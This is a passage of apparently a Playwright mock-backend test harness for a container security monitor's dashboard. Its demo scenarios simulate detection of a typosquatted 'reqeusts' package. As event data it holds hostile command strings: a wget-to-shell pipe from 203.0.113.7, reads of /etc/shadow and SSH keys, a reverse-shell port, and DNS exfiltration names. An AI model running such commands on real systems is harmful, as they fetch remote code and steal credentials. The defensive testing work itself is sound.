      killedCount: 2,
      topContainers: [{ name: RT, violations: 5 }],
      trend,
      wsClients: 1,
      dropped: 0,
      enforceKill: true,
      source: 'mock',
    };
  }

  // ── 시나리오 도우미 ──
  empty() {
    this.installs = [];
    this.cases = [];
    this.proposals = [];
    this.changes = [];
    this.blocklist = { packages: [], images: [], hosts: [] };
    return this;
  }
  case(id: string) {
    return this.cases.find((c) => c.id === id)!;
  }
  // 11/04 종합 판정: 런타임 통과 + 정적 악성(정적만 악성이면 건을 열지 않는다 — caseId 없음)
  staticMalicious(id = 'ins-0014') {
    const now = Date.now();
    const s: InstallSession = {
      id, manager: 'pip', packages: ['reqeusts'], container: `sg-install-pip-${Math.floor(now / 1000)}-${id.slice(-4)}`, containerId: `${id}abcdef0123456789`, image: PYIMG,
      startedAt: ago(now, 30), finishedAt: ago(now, 24), exitCode: 0, status: 'passed', caseId: null, refusedBy: null, violations: [],
      activity: { kinds: { exec: 1, open: 9, connect: 2 }, hosts: [{ host: 'pypi.org', ip: '151.101.0.223', port: 443, count: 2, level: 'normal' }], programs: [{ comm: 'pip', args: 'pip install reqeusts', count: 1, level: 'normal' }] },
      scanId: 'scan-0104',
      scan: installScan({ id: 'scan-0104', status: 'done', verdict: 'malicious', label: 'pip reqeusts', version: '1.0.2', riskScore: 8.6, installThreats: 2, threats: 3 }),
    };
    this.installs.unshift(s);
    return s;
  }
  // 11/04: 정적 검사만 실행 중인 끝난 세션(런타임 통과) → finishScan 으로 done 전환 — 상세 2초 폴링 조건(running || scan.status==='running')
  scanRunning(id = 'ins-0015') {
    const now = Date.now();
    const s: InstallSession = {
      id, manager: 'pip', packages: ['pyyaml'], container: `sg-install-pip-${Math.floor(now / 1000)}-${id.slice(-4)}`, containerId: `${id}abcdef0123456789`, image: PYIMG,
      startedAt: ago(now, 12), finishedAt: ago(now, 6), exitCode: 0, status: 'passed', caseId: null, refusedBy: null, violations: [],
      activity: { kinds: { exec: 1, open: 9, connect: 2 }, hosts: [{ host: 'pypi.org', ip: '151.101.0.223', port: 443, count: 2, level: 'normal' }], programs: [{ comm: 'pip', args: 'pip install pyyaml', count: 1, level: 'normal' }] },
      scanId: 'scan-0105',
      scan: installScan({ id: 'scan-0105', status: 'running', label: 'pip pyyaml', version: '6.0.3' }),
    };
    this.installs.unshift(s);
    return s;
  }
  finishScan(id: string, patch: Partial<InstallScan> = { verdict: 'clean', riskScore: 0 }) {
    const s = this.installs.find((x) => x.id === id)!;
    s.scan = { ...s.scan!, status: 'done', ...patch };
    return s;
  }
  // 10/30: dns 규칙 2개 + dns 이벤트(런타임 경고 2 · 설치 ins-0012 의 sandbox-dns 격리 대상 1) + 활동 요약 「조회」 + 수집량 dns
  enableDns() {
    const now = this.now;
    this.rules.push(...dnsRules());
    const RT = 'pkg-reqeusts';
    const RTIMG = 'demo/reqeusts:1.0.2';
    const rt: Verdict[] = [
      alert(dnsEvent(now, 57, RT, RTIMG, DNS_EXFIL_NAME, 'A'), 'runtime-dns-exfil', `긴 DNS 라벨(유출 의심): ${DNS_EXFIL_NAME} (라벨 48자 > 40)`),
      alert(dnsEvent(now, 57, RT, RTIMG, 'data.exfil.example', 'TXT'), 'runtime-dns-exfil', '금지 질의 유형: data.exfil.example (TXT)'),
    ];
    this.recent.unshift(...rt);
    const top = Math.max(0, ...this.audit.map((a) => a.id));
    this.audit.unshift(...rt.map((v, i) => ({ ...v, id: top + 2 - i, caseId: 'case-0005', install: null })));
    const c5 = this.cases.find((c) => c.id === 'case-0005');
    if (c5) {
      c5.violations += 2;
      c5.ruleIds = [...c5.ruleIds, 'runtime-dns-exfil'];
    }
    const s = this.installs.find((x) => x.id === 'ins-0012');
    if (s) {
      const v: InstallViolation = { ...kill(dnsEvent(now, 609, s.container, PYIMG, 'cdn.reqeusts-update.test', 'A'), 'sandbox-dns', '허용 목록 밖 도메인 질의: cdn.reqeusts-update.test (A)'), enforced: false, dryRun: true, count: 1 };
      s.violations = [...(s.violations ?? []), v];
      if (s.activity) s.activity.kinds = { ...s.activity.kinds, dns: 4 };
      const c4 = this.cases.find((c) => c.id === 'case-0004');
      if (c4) {
        c4.violations += 1;
        c4.ruleIds = [...c4.ruleIds, 'sandbox-dns'];
      }
      this.audit.unshift({ ...v, caseId: 'case-0004', install: { id: 'ins-0012', label: 'pip ./reqeusts' }, id: top + 3 });
      this.audit.sort((a, b) => b.id - a.id);
    }
    this.dnsCollected = true;
    for (const c of this.collected) c.dns = 1 + (c.minute % 2);
    return this;
  }
  // 10/30: 격리 타임라인 — ins-0012(설치) · case-0005(런타임)의 첫 kill 판정 + 그 감사 행. 설치 쪽은 알림 구간 없음(「—」 재현)
  enableIsolation() {
    const s = this.installs.find((x) => x.id === 'ins-0012');
    const first = s?.violations?.[0];
    if (s && first) {
      const tl = timeline(Date.parse(first.event.timestamp), { notifyMs: null });
      first.timeline = tl;
      const row = this.audit.find((a) => a.caseId === 'case-0004' && a.ruleId === first.ruleId);
      if (row) row.timeline = tl;
      s.isolation = { auditId: row?.id ?? 0, timeline: tl };
    }
    const c5 = this.cases.find((c) => c.id === 'case-0005');
    const row5 = this.audit.filter((a) => a.caseId === 'case-0005' && a.action === 'kill').sort((a, b) => a.event.timestamp.localeCompare(b.event.timestamp))[0];
    if (c5 && row5) {
      row5.timeline = timeline(Date.parse(row5.event.timestamp), { killMs: 380, notifyMs: 390 });
      c5.isolation = { auditId: row5.id, timeline: row5.timeline };
    }
    const r = this.recent.find((v) => v.event.containerName === 'pkg-reqeusts' && v.action === 'kill');
    if (r && row5?.timeline) r.timeline = row5.timeline;
    return this;
  }
  // 10/30: 시연 켜기(/api/info.demo = true + /api/demo 경로)
  enableDemo() {
    this.info.demo = true;
    this.demo.enabled = true;
    return this;
  }
  // 11/04: 연쇄 규칙 chain-download-secrets(sandbox-dns 가 있으면 그 뒤, 없으면 시스템 규칙 앞) + 연쇄가 이긴 감사 1행(web-api · 격리 대상 · 건 없음)
  // + 최근 판정 2건(연쇄가 이긴 판정 · 단일 규칙 sensitive-files 가 이기고 연쇄는 주석인 판정)
  enableSequence() {
    const now = this.now;
    const dns = this.rules.findIndex((r) => r.id === 'sandbox-dns');
    this.rules.splice(dns >= 0 ? dns + 1 : this.rules.findIndex((r) => r.id === 'blocklist-hosts'), 0, sequenceRule());
    const WEB = 'web-api';
    const WIMG = 'demo/web-api:2.3';
    const t0 = now - 40_000;
    const won: Verdict = {
      event: { ...ev(now, 40 - 2.4, WEB, WIMG, { kind: 'open', comm: 'python3', path: '/root/.netrc' }), pid: 4302 },
      matched: true,
      ruleId: SEQ_RULE_ID,
      action: 'kill',
      dryRun: true,
      reason: '연쇄 3단계(10초 안): exec wget → connect 203.0.113.7:80 → open /root/.netrc · 2.4초',
      sequence: sequenceHit(t0),
    };
    const t1 = now - 20_000;
    const note: Verdict = {
      ...kill({ ...ev(now, 20 - 2.4, WEB, WIMG, { kind: 'open', comm: 'python3', path: '/root/.ssh/id_rsa' }), pid: 4302 }, 'sensitive-files', '금지 경로 /root/.ssh/ 접근'),
      sequence: sequenceHit(t1, { path: '/root/.ssh/id_rsa' }),
    };
    this.recent.unshift(note, won);
    const top = Math.max(0, ...this.audit.map((a) => a.id));
    this.audit.unshift({ ...won, id: top + 1, caseId: null, install: null });
    return this;
  }
  // R3 11/04: Run.explain — backend demo/explain.go BuildExplain 과 같은 규칙. 세션 위반 중 가장 강한 판정(같으면 이른 것) + 지금 정책의 설명 · 조건,
  // chain 이면 연쇄 규칙(정책에 없으면 기본 정책 chain-download-secrets)의 단계별 진행. 세션이 없거나 거부면 explain 없음
  private demoExplainOf(run: DemoRun): DemoExplain | undefined {
    if (!run.installId || run.status === 'refused') return undefined;
    const s = this.installs.find((x) => x.id === run.installId);
    if (!s) return undefined;
    const rank: Record<Level, number> = { normal: 0, alert: 1, held: 2, killed: 3 };
    let best: InstallViolation | null = null;
    for (const v of s.violations ?? []) {
      if (!best) best = v;
      else {
        const a = rank[levelOf(v)], b = rank[levelOf(best)];
        if (a > b || (a === b && v.event.timestamp < best.event.timestamp)) best = v;
      }
    }
    const rule = best && this.rules.find((r) => r.id === best.ruleId);
    const e = best?.event;
    const decidedBy: DemoDecider | null = best && e
      ? {
          ruleId: best.ruleId ?? '', description: rule?.description ?? '', condition: rule ? ruleCondition(rule) : '', action: best.action ?? 'alert', dryRun: !!best.dryRun, enforced: !!best.enforced, reason: best.reason ?? '',
          event: { kind: e.kind, timestamp: e.timestamp, comm: e.comm, pid: e.pid, args: e.args ?? '', path: e.path ?? '', dstIp: e.dstIp ?? '', dstPort: e.dstPort ?? 0, dstHost: e.dstHost ?? '', qtype: e.qtype ?? '' },
          ...(best.sequence ? { sequence: best.sequence.ruleId } : {}),
        }
      : null;
    let sequence: DemoSequence | null = null;
    if (run.scenario === 'chain') {
      const r = this.rules.find((x) => x.id === SEQ_RULE_ID && x.kind === 'sequence') ?? this.rules.find((x) => x.kind === 'sequence') ?? sequenceRule();
      const steps = r.steps ?? [];
      const evs = (s.violations ?? []).map((v) => v.event).sort((a, b) => a.timestamp.localeCompare(b.timestamp));
      const got: SequenceStep[] = [];
      for (const x of evs) {
        if (got.length === steps.length) break;
        if (got.length && Date.parse(x.timestamp) - Date.parse(got[0].timestamp) > (r.windowSeconds ?? 0) * 1000) break;
        if (stepMatches(steps[got.length], x)) got.push({ kind: x.kind, timestamp: x.timestamp, comm: x.comm, pid: x.pid, detail: eventDetail(x) });
      }
      sequence = {
        ruleId: r.id, description: r.description ?? '', action: r.action, dryRun: !!r.dryRun, disabled: !!r.disabled, windowSeconds: r.windowSeconds ?? 0, completed: false,
        steps: steps.map((st, i) => ({ kind: st.kind, condition: ruleCondition(st), matched: !!got[i], event: got[i] ?? null, gapMs: i > 0 && got[i] ? Date.parse(got[i].timestamp) - Date.parse(got[i - 1].timestamp) : null })),
      };
    }
    return { decidedBy, sequence };
  }
  // 시연 모의 재생(계약 §2 mock 소스): 세션 → 정상 이벤트 → 시나리오 이벤트 순서대로, 첫 kill 판정에서 멈춘다
  private startDemo(run: DemoRun) {
    const ctr = run.container;
    const at = (ms = 0) => new Date(Date.now() + ms).toISOString();
    const session: InstallSession = {
      id: run.installId, manager: 'pip', packages: ['./reqeusts'], container: ctr, containerId: `${run.installId}abcdef0123456789`, image: PYIMG,
      startedAt: run.startedAt, finishedAt: null, exitCode: null, status: 'running', caseId: null, refusedBy: null, violations: [],
      activity: { kinds: {}, hosts: [], programs: [] },
    };
    this.installs.unshift(session);
    const e = (x: Partial<Event> & Pick<Event, 'kind' | 'comm'>) => ev(Date.now(), 0, ctr, PYIMG, x);
    const V: Record<DemoScenario, (() => Verdict)[]> = {
      shell: [
        () => kill(e({ kind: 'exec', comm: 'sh', args: 'sh -c wget -qO- http://203.0.113.7/p.sh | sh' }), 'pipe-to-shell', '금지 인자 패턴: | sh'),
        () => kill(e({ kind: 'open', comm: 'python3', path: '/etc/shadow' }), 'sandbox-secrets', '민감 파일 접근: /etc/shadow'),
      ],
      revshell: [() => kill(e({ kind: 'connect', comm: 'python3', dstIp: '203.0.113.7', dstPort: 4444 }), 'reverse-shell-ports', '금지 포트 연결: 203.0.113.7:4444')],
      'direct-ip': [() => kill(e({ kind: 'connect', comm: 'python3', dstIp: '203.0.113.7', dstPort: 443 }), 'sandbox-egress', '허용 목록 밖 외부 연결: 203.0.113.7:443')],
      domain: [
        () => ({ ...kill(e({ kind: 'dns', comm: 'python3', dstHost: 'example.com', qtype: 'A', dstIp: '127.0.0.11', dstPort: 53 }), 'sandbox-dns', '허용 목록 밖 도메인 질의: example.com (A)'), enforced: false, dryRun: true }),
        () => kill(e({ kind: 'connect', comm: 'python3', dstIp: '93.184.216.34', dstPort: 443, dstHost: 'example.com' }), 'sandbox-egress', '허용 목록 밖 외부 연결: 93.184.216.34:443 (example.com)'),
      ],
      'dns-exfil': [
        () => alert(e({ kind: 'dns', comm: 'python3', dstHost: DNS_EXFIL_NAME, qtype: 'A', dstIp: '127.0.0.11', dstPort: 53 }), 'runtime-dns-exfil', `긴 DNS 라벨(유출 의심): ${DNS_EXFIL_NAME} (라벨 48자 > 40)`),
        () => alert(e({ kind: 'dns', comm: 'python3', dstHost: 'data.exfil.example', qtype: 'TXT', dstIp: '127.0.0.11', dstPort: 53 }), 'runtime-dns-exfil', '금지 질의 유형: data.exfil.example (TXT)'),
      ],
      benign: [], // 11/04: 정상 대조군 — 위반 없음
      chain: [() => kill(e({ kind: 'exec', comm: 'wget', args: 'wget -q -O /dev/null http://203.0.113.7/stage2' }), 'no-shell-download', '금지 프로세스 실행: wget')], // 11/04: 기본 정책은 1단계에서 격리
      all: [],
    };
    V.all = [...V.shell, ...V.revshell, ...V['direct-ip'], ...V.domain, ...V['dns-exfil']];
    const steps: (() => void)[] = [];
    // ② 정상 이벤트 1건(설치 시작)
    steps.push(() => {
      const v = ok(e({ kind: 'exec', comm: 'pip', args: 'pip install --no-cache-dir --progress-bar off /pkg/reqeusts' }));
      session.activity!.kinds.exec = (session.activity!.kinds.exec ?? 0) + 1;
      session.activity!.programs.push({ comm: 'pip', args: v.event.args!, count: 1, level: 'normal' });
      this.recent.unshift(v);
      this.send({ type: 'verdict', data: v });
    });
    let stopped = false;
    const finish = (status: InstallSession['status'], exitCode: number) => {
      session.status = status;
      session.exitCode = exitCode;
      session.finishedAt = at();
      run.status = 'finished';
      run.exitCode = exitCode;
      run.finishedAt = session.finishedAt;
      this.demo.last = run;
      this.demo.running = null;
      if (status !== 'passed') {
        const n = ++this.seq;
        const level = status === 'isolated' ? 'killed' : 'alert';
        const c: Case = {
          id: `case-${String(n).padStart(4, '0')}`, source: 'install', installId: session.id, container: ctr, label: 'pip ./reqeusts', image: PYIMG, package: 'pip:reqeusts',
          openedAt: at(), level, violations: session.violations!.reduce((k, v) => k + v.count, 0), ruleIds: [...new Set(session.violations!.map((v) => v.ruleId!))],
          state: 'open', decision: 'pending', decidedAt: null, decidedBy: null, note: '', proposalId: null, closedAt: null, isolation: session.isolation ?? null,
        };
        session.caseId = c.id;
        this.cases.unshift(c);
        for (const a of this.audit) if (a.event.containerName === ctr) a.caseId = c.id;
        this.send({ type: 'case', data: { ...c } });
      }
    };
    for (const mk of V[run.scenario]) {
      steps.push(() => {
        if (stopped) return;
        const v = mk();
        if (v.enforced) v.timeline = timeline(Date.parse(v.event.timestamp));
        const k = v.event.kind;
        session.activity!.kinds[k] = (session.activity!.kinds[k] ?? 0) + 1;
        const iv: InstallViolation = { ...v, count: 1 };
        session.violations!.push(iv);
        const top = Math.max(0, ...this.audit.map((a) => a.id)) + 1;
        this.audit.unshift({ ...v, id: top, caseId: null, install: { id: session.id, label: 'pip ./reqeusts' } });
        this.recent.unshift(v);
        this.send({ type: 'verdict', data: v });
        if (v.enforced) {
          stopped = true;
          session.isolation = { auditId: top, timeline: v.timeline! };
          // R3 11/04: kill 직전 증거(GET /api/evidence?container=) — 로그 3줄 · 파일 변경 2 · 프로세스 2
          this.evidence.push({
            id: `ev-${run.id}`, containerId: session.containerId!, containerName: ctr, image: PYIMG, collectedAt: at(), partial: false, durationMs: 295,
            logs: 'Collecting ./reqeusts\nRunning setup.py install\n[demo] shell start', changes: [{ kind: 'A', path: '/tmp/p.sh' }, { kind: 'C', path: '/etc/hosts' }],
            processes: [{ pid: 1, user: 'root', cmd: 'pip install /pkg/reqeusts' }, { pid: 4242, user: 'root', cmd: v.event.args ?? v.event.comm }],
          });
          finish('isolated', 137);
        }
      });
    }
    steps.push(() => {
      if (!stopped) finish(session.violations!.length ? 'warned' : 'passed', 0);
    });
    steps.forEach((fn, i) => this.demoTimers.push(setTimeout(fn, this.demoStepMs * (i + 1)) as unknown as number));
  }
  // W16: 앱은 로그인 확인(/api/auth/me) 뒤에 실시간 연결을 연다 — 그 전에 보낸 메시지는 연결되면 보낸다
  private pending: string[] = [];
  send(msg: WsMessage) {
    if (this.ws) this.ws.send(JSON.stringify(msg));
    else this.pending.push(JSON.stringify(msg));
  }
  writes() {
    return this.requests.filter((r) => r.method !== 'GET');
  }

  // 10/20 도우미: 새 건이 열린 것처럼 — 설치 세션(설치 건이면) · 건을 만들고 WS {type:"case"} 로 알린다
  openCase(o: { source?: 'install' | 'runtime'; level?: Level; ruleIds?: string[]; label?: string } = {}): Case {
    const n = ++this.seq;
    const id = `case-${String(n).padStart(4, '0')}`;
    const source = o.source ?? 'install';
    const level = o.level ?? (this.info.enforceKill ? 'killed' : 'held');
    const ruleIds = o.ruleIds ?? ['pipe-to-shell', 'no-shell-download', 'sandbox-secrets', 'sensitive-files', 'sandbox-egress'];
    const now = Date.now();
    const at = new Date(now).toISOString();
    const installId = source === 'install' ? `ins-${String(n).padStart(4, '0')}` : null;
    const container = source === 'install' ? `sg-install-pip-${Math.floor(now / 1000)}-${n}` : (o.label ?? 'pkg-runtime');
    if (installId) {
      const violations: InstallViolation[] = ruleIds.map((r, i) => ({
        ...(level === 'alert' ? alert : kill)(ev(now, 2 - i * 0.1, container, PYIMG, { kind: 'exec', comm: 'sh', args: `sh -c demo ${r}` }), r, r),
        enforced: level === 'killed',
        count: 1,
      }));
      this.installs.unshift({
        id: installId, manager: 'pip', packages: ['./reqeusts'], container, containerId: `${installId}abcdef0123456789`, image: PYIMG,
        startedAt: ago(now, 5), finishedAt: at, exitCode: level === 'killed' ? 137 : 0, status: level === 'alert' ? 'warned' : 'isolated',
        caseId: id, refusedBy: null, violations, activity: { kinds: { exec: ruleIds.length }, hosts: [], programs: [] },
      });
    }
    const c: Case = {
      id, source, installId, container, label: o.label ?? (source === 'install' ? 'pip ./reqeusts' : container), image: source === 'install' ? PYIMG : 'demo/runtime:1.0',
      package: source === 'install' ? 'pip:reqeusts' : null, openedAt: at, level, violations: ruleIds.length, ruleIds, state: 'open', decision: 'pending',
      decidedAt: null, decidedBy: null, note: '', proposalId: null, closedAt: null,
    };
    this.cases.unshift(c);
    this.send({ type: 'case', data: { ...c } });
    return c;
  }

  async attach(page: Page) {
    await page.routeWebSocket(/\/ws\/events$/, (ws) => {
      // 실제 백엔드는 로그인 안 된 /ws/events 업그레이드를 401 로 거절한다 — 여기서는 바로 닫는다
      if (!this.auth.active()) {
        void ws.close({ code: 1008, reason: 'unauthorized' });
        return;
      }
      if (this.wsRefuse) {
        void ws.close({ code: 1006, reason: 'down' });
        return;
      }
      this.ws = ws;
      // StrictMode 는 첫 연결을 바로 닫고 다시 연다 — 남은 연결(마지막 ws)에만 밀린 메시지를 보낸다
      setTimeout(() => {
        if (this.ws === ws) for (const m of this.pending.splice(0)) void ws.send(m);
      }, 200); // connectToServer 를 부르지 않으므로 서버 없이 열린 상태가 된다
      ws.onMessage(() => {});
    });
    await page.route(/\/api\//, (route) => this.handle(route));
  }

  private async handle(route: Route) {
    const req = route.request();
    const url = new URL(req.url());
    const path = url.pathname.replace(/^\/api/, '');
    const method = req.method();
    const body = req.postData() ?? undefined;
    this.requests.push({ method, path: path + url.search, auth: req.headers()['authorization'] ?? null, body });

    if ([...this.unsupported].some((p) => path.startsWith(p))) {
      return route.fulfill({ status: 404, contentType: 'text/plain; charset=utf-8', body: '404 page not found' });
    }
    const json = (data: unknown, status = 200) => route.fulfill({ status, contentType: 'application/json', body: JSON.stringify(data) });
    const fail = (status: number, error: string) => json({ error }, status);
    if (this.failing.has(path)) return fail(this.failing.get(path)!, '모의 오류(서버가 응답하지 않습니다)');
    const q = url.searchParams;
    // 읽기 전용 POST(미리보기 · AI 도우미 질문)는 조회자도 부른다 — 백엔드 ViewerWritePatterns
    const writing = method !== 'GET' && !path.endsWith('/preview') && path !== '/chat';
    // 인증 미들웨어(backend auth.Middleware) → 단계 · 계정 · 라이선스 경로
    const gate = this.auth.gate(method, path, writing);
    if (gate) return json(gate.body, gate.status);
    const a = this.auth.handle(method, path, body, q);
    if (a) return a.status === 204 ? route.fulfill({ status: 204 }) : json(a.body, a.status);
    if (method === 'POST' && path === '/notify/test') {
      const n = this.info.notify;
      if (!n?.channels.length) return fail(409, '설정된 알림 채널이 없습니다');
      this.notifyTests++;
      // 발송은 비동기 — 다음 /api/info 에서 보낸 수가 오른다
      n.channels = n.channels.map((c) => ({ ...c, sent: c.sent + 1, lastAt: new Date().toISOString() }));
      n.sent += n.channels.length;
      return json({ queued: n.channels.length }, 202);
    }
    let m: RegExpMatchArray | null;

    // 10/30 시연 실행 API(계약 §2) — DEMO_ENABLED 가 아니면 경로 자체가 없다(404 텍스트)
    if (path === '/demo' || path === '/demo/run') {
      if (!this.info.demo) return route.fulfill({ status: 404, contentType: 'text/plain', body: '404 page not found' });
      if (method === 'GET' && path === '/demo') {
        const withExplain = (r: DemoRun | null) => (!r || r.explain !== undefined ? r : { ...r, ...(this.demoExplain ? { explain: this.demoExplainOf(r) } : {}) });
        return json({ enabled: true, scenarios: DEMO_SCENARIOS, running: withExplain(this.demo.running), last: withExplain(this.demo.last) } satisfies DemoState);
      }
      if (method === 'POST' && path === '/demo/run') {
        const { scenario } = JSON.parse(body || '{}') as { scenario?: DemoScenario };
        if (!scenario || !DEMO_SCENARIOS.includes(scenario)) return fail(400, 'scenario: all | shell | revshell | direct-ip | domain | dns-exfil | benign | chain');
        if (this.demo.running) return json({ error: '시연이 이미 실행 중입니다', running: this.demo.running }, 409);
        if (this.demoDown) return fail(503, 'Docker 에 연결할 수 없습니다');
        const n = ++this.seq;
        const run = demoRun(scenario, `ins-${String(n).padStart(4, '0')}`, Math.floor(Date.now() / 1000) + n);
        run.startedAt = new Date().toISOString(); // R3 11/04: id 는 겹치지 않게 앞당긴 초, 시작 시각은 지금(단계 도착 시각 · +N ms)
        this.addChange('demo_run', `시연 실행: ${scenario}`);
        if (this.demoRefused) {
          // 차단 목록에 pip:reqeusts 가 있으면 sg-install 처럼 설치 전 거부 세션
          run.status = 'refused';
          run.finishedAt = run.startedAt;
          this.installs.unshift({ id: run.installId, manager: 'pip', packages: ['./reqeusts'], container: '', image: PYIMG, startedAt: run.startedAt, finishedAt: run.startedAt, status: 'refused', refusedBy: { list: 'packages', value: 'pip:reqeusts' }, caseId: null });
          this.demo.last = run;
          return json(run, 202);
        }
        this.demo.running = run;
        this.startDemo(run);
        return json(run, 202);
      }
    }

    // 11/06 연동
    if (method === 'GET' && path === '/integration') return json(this.integration);
    if (method === 'GET' && (m = path.match(/^\/integration\/containers\/([^/]+)$/))) {
      const id = decodeURIComponent(m[1]);
      const c = this.integration.containers.find((x) => x.id === id);
      if (!c || this.detailMissing.has(id)) return fail(404, '컨테이너를 찾을 수 없습니다. 이미 종료되었거나 감시 목록에 없는 컨테이너입니다');
      return json({ ...c, state: 'running', restartCount: 0, ports: [], labels: {}, ...this.containerDetails[id] });
    }
    if (method === 'GET' && path === '/sginstall/setup') return json(this.sgSetup);
    if (method === 'GET' && path === '/tools/sg-install')
      return route.fulfill({ status: 200, contentType: 'text/x-shellscript', headers: { 'Content-Disposition': 'attachment; filename="sg-install"' }, body: '#!/usr/bin/env bash\necho sg-install\n' });
    if (method === 'POST' && path === '/integration/test') {
      if (this.integrationDown || !this.integration.env.testable) return fail(503, '이 서버에서는 연결 테스트를 할 수 없습니다');
      if (this.integration.test?.state === 'running') return fail(409, '연결 테스트가 이미 진행 중입니다');
      const unix = Math.floor(Date.now() / 1000) + ++this.seq;
      const t = { id: `probe-${unix}`, container: `sg-probe-${unix}`, state: 'running' as const, startedAt: new Date().toISOString(), events: {} };
      this.integration = { ...this.integration, test: t };
      this.addChange('integration_test', `연결 테스트: ${t.container}`);
      setTimeout(() => {
        if (this.integration.test?.id !== t.id) return;
        this.integration = { ...this.integration, test: { ...t, state: 'passed', endedAt: new Date().toISOString(), events: { exec: 5, open: 1 } } };
      }, this.integrationTestMs);
      return json(t, 202);
    }

    // 기존 API
    if (method === 'GET' && path === '/info') return json(this.info);
    if (method === 'GET' && path === '/stats') return json(this.stats);
    if (method === 'GET' && path === '/events/recent') return json(this.recent.slice(0, Number(q.get('limit') ?? 500)));
    if (method === 'GET' && path === '/policies') return json(this.rules.map((r) => this.view(r)));
    if (method === 'GET' && path === '/policies/export') return route.fulfill({ status: 200, contentType: 'application/yaml', body: this.rules.map((r) => `- id: ${r.id}\n  kind: ${r.kind}\n  action: ${r.action}\n`).join('') });
    // eBPF 수집 종합(10/16) — 백엔드 internal/summary 와 같은 규칙
    if (method === 'GET' && path === '/summary') return json(this.summary(q.get('range') || '24h'), this.summaryRanges[q.get('range') || '24h'] ? 200 : 400);
    // 정책 저장 전 확인(10/16): 그 정책이 걸었던 감사 행의 탐지 결과가 새 대응으로 어떻게 바뀌나(간이 재평가)
    if (method === 'POST' && path === '/policies/preview') {
      const r = JSON.parse(body ?? '{}') as Rule;
      if (r.id === 'blocklist-hosts') return fail(409, '차단 목록에서 관리하는 시스템 규칙입니다');
      const after: Level = r.disabled ? 'normal' : r.action !== 'kill' ? 'alert' : r.dryRun ? 'held' : 'killed';
      const changed = this.audit
        .filter((a) => a.ruleId === r.id && levelOf(a) !== after)
        .map((a) => ({ auditId: a.id, before: levelOf(a), after, container: a.event.containerName, ruleId: r.id }));
      const blocking = (l: string) => l === 'killed' || l === 'held';
      const pv: Preview = { evaluated: this.audit.length, changed, nextOnly: [], counts: { toNormal: changed.filter((c) => c.after === 'normal').length, toBlocked: changed.filter((c) => blocking(c.after) && !blocking(c.before)).length } };
      return json(pv);
    }
    if (method === 'POST' && path === '/policies') {
      const r = JSON.parse(body ?? '{}') as Rule;
      // 11/09: 백엔드는 모르는 칸을 거절한다(updatedAt · updatedBy 는 응답에만 있는 칸)
      const unknown = Object.keys(r).find((k) => !RULE_KEYS.has(k));
      if (unknown) return fail(400, `JSON 형식 오류: json: unknown field "${unknown}"`);
      // 11/04: 연쇄 규칙 검사(backend rules.Rule.Validate 422 문구)
      const bad = validateSequence(r);
      if (bad.length) return fail(422, bad.join('\n'));
      const i = this.rules.findIndex((x) => x.id === r.id);
      const before = i >= 0 ? clone(this.rules[i]) : undefined;
      if (i >= 0) this.rules[i] = r;
      else this.rules.push(r);
      this.addChange('policy_edit', `정책 ${r.id} 저장`, null, null, '', { ruleIds: [r.id], before: before && { [r.id]: before }, after: { [r.id]: clone(r) } });
      return json(this.view(r));
    }
    if (method === 'PUT' && path === '/policies') {
      this.addChange('policy_replace', `정책 ${this.rules.length}개 YAML 교체`);
      return json(this.rules.map((r) => this.view(r)));
    }
    // 11/09 정책 되돌리기(backend review.RevertPolicy) — 사유 필수 · 그 변경 직전 값으로 정책 하나 전체
    if (method === 'POST' && (m = path.match(/^\/policies\/([^/]+)\/revert$/))) {
      const id = decodeURIComponent(m[1]);
      let inp: { changeId?: string; reason?: string };
      try {
        inp = JSON.parse(body || '') as typeof inp;
      } catch {
        return fail(400, 'JSON 형식 오류: invalid character');
      }
      const extra = Object.keys(inp).find((k) => k !== 'changeId' && k !== 'reason');
      if (extra) return fail(400, `JSON 형식 오류: json: unknown field "${extra}"`);
      if (id === 'blocklist-hosts') return fail(409, 'blocklist-hosts 는 차단 목록에서 관리하는 시스템 규칙, 차단 목록(/api/blocklist)에서 바꾼다');
      const reason = (inp.reason ?? '').trim();
      if (!reason) return fail(400, 'reason: 되돌리는 사유가 필요함');
      if (!inp.changeId) return fail(400, 'changeId 가 필요함');
      const src = this.changes.find((c) => c.id === inp.changeId);
      if (!src) return fail(404, '변경 기록 없음');
      if (!(src.ruleIds ?? []).includes(id)) return fail(404, `정책 ${id} 의 변경 기록이 아님`);
      const restored = src.before?.[id];
      if (!restored) return fail(409, src.after?.[id] ? `이 변경 전에는 정책 ${id} 없음(새로 만든 기록), 지우려면 정책 삭제 사용` : `이 변경에는 정책 ${id} 의 변경 전 값 없음`);
      const i = this.rules.findIndex((x) => x.id === id);
      const cur = i >= 0 ? clone(this.rules[i]) : undefined;
      if (cur && sameRule(cur, restored)) return fail(409, `정책 ${id}: 이미 그 변경 전 값과 같음`);
      const next = clone(restored);
      if (i >= 0) this.rules[i] = next;
      else this.rules.push(next);
      this.addChange('policy_revert', `정책 ${id} 되돌림(${src.id} 이전 값)`, null, null, reason, { ruleIds: [id], before: cur && { [id]: cur }, after: { [id]: clone(next) }, revertOf: src.id });
      return json(this.view(next));
    }
    if (method === 'DELETE' && (m = path.match(/^\/policies\/(.+)$/))) {
      const id = decodeURIComponent(m[1]);
      const cur = this.rules.find((r) => r.id === id);
      this.rules = this.rules.filter((r) => r.id !== id);
      this.addChange('policy_edit', `정책 ${id} 삭제`, null, null, '', cur ? { ruleIds: [id], before: { [id]: clone(cur) } } : { ruleIds: [id] });
      return route.fulfill({ status: 204 });
    }
    if (method === 'GET' && path === '/audit') {
      const since = q.get('since') ? new Date(q.get('since')!).getTime() : -Infinity;
      const until = q.get('until') ? new Date(q.get('until')!).getTime() : Infinity;
      const before = Number(q.get('before') ?? Infinity);
      const rows = this.audit.filter((a) => {
        const t = new Date(a.event.timestamp).getTime();
        return (
          (!q.get('kind') || a.event.kind === q.get('kind')) &&
          (!q.get('action') || a.action === q.get('action')) &&
          // 규칙은 완전 일치(backend store rule_id = $ · memory.go) — 11/09 정책 「차단 이력」
          (!q.get('rule') || (a.ruleId ?? '') === q.get('rule')) &&
          (!q.get('container') || a.event.containerName.includes(q.get('container')!)) &&
          t >= since &&
          t <= until &&
          a.id < before
        );
      });
      const limit = Math.min(500, Number(q.get('limit') ?? 100) || 100);
      if (this.auditDelayMs) await new Promise((r) => setTimeout(r, this.auditDelayMs));
      if (q.has('offset') && !this.auditLegacy) {
        const offset = Number(q.get('offset'));
        return json({ items: rows.slice(offset, offset + limit), total: rows.length, offset, limit });
      }
      return json(rows.slice(0, limit));
    }

    // 설치 검사
    if (method === 'GET' && path === '/installs') {
      const rows = this.installs
